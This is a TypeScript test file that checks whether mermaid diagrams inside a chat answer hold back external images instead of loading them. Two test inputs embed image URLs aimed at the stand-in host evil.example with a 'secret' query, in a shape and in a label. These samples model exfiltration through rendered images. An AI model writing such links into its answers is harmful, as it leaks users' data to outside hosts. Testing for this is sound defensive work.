// @vitest-environment jsdom
import { expect, test, vi } from 'vitest'

const matrix = () => ({ a: 1, b: 0, c: 0, d: 1, e: 0, f: 0 })
Object.assign(SVGElement.prototype, {
  getBBox: () => ({ x: 0, y: 0, width: 10, height: 10 }),
  getComputedTextLength: () => 10,
  createSVGMatrix: matrix,
  getScreenCTM: matrix,
})

const fetched: string[] = []
const ownSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src')
Object.defineProperty(HTMLImageElement.prototype, 'src', {
  configurable: true,
  get(this: HTMLImageElement) {
    return ownSrc?.get?.call(this) as string
  },
  set(this: HTMLImageElement, value: string) {
    fetched.push(value)
    ownSrc?.set?.call(this, value)
  },
})
Object.defineProperty(HTMLImageElement.prototype, 'complete', { get: () => true })
Object.defineProperty(HTMLImageElement.prototype, 'naturalWidth', { get: () => 40 })
Object.defineProperty(HTMLImageElement.prototype, 'naturalHeight', { get: () => 40 })
Object.assign(HTMLImageElement.prototype, { decode: () => Promise.resolve() })

new MutationObserver((records) => {
  for (const record of records) {
    for (const node of record.addedNodes) {
      if (!(node instanceof Element)) continue
      for (const one of [node, ...node.querySelectorAll('img, image')]) {
        if (one.localName !== 'img' && one.localName !== 'image') continue
        const address = one.getAttribute('src') ?? one.getAttribute('href')
        if (address) fetched.push(address)
      }
    }
  }
}).observe(document, { childList: true, subtree: true })

const { answerHtml } = await import('./drawn')
const { drawing } = await import('../../chat-kit/src/api')

async function drawnAnswer(markdown: string): Promise<string> {
  fetched.length = 0
  const before = drawing.version
  answerHtml(markdown)
  await vi.waitFor(() => {
    expect(drawing.version).toBeGreaterThan(before)
  })
  return answerHtml(markdown)
}

test('a picture shape in a diagram an answer drew is held until asked', async () => {
  const html = await drawnAnswer(
    '```mermaid\nflowchart TD\n  A@{ img: "https://evil.example/shape?secret=42", label: "x", h: 60 }\n```',
  )
  expect(fetched.filter((address) => address.includes('evil.example'))).toEqual([])
  expect(html).not.toMatch(/<image\b[^>]*evil\.example/)
})

test('a picture in a diagram label an answer drew is held until asked', async () => {
  await drawnAnswer(
    '```mermaid\nflowchart TD\n  B["<img src=\'https://evil.example/label?secret=42\'>"]\n```',
  )
  expect(fetched.filter((address) => address.includes('evil.example'))).toEqual([])
})
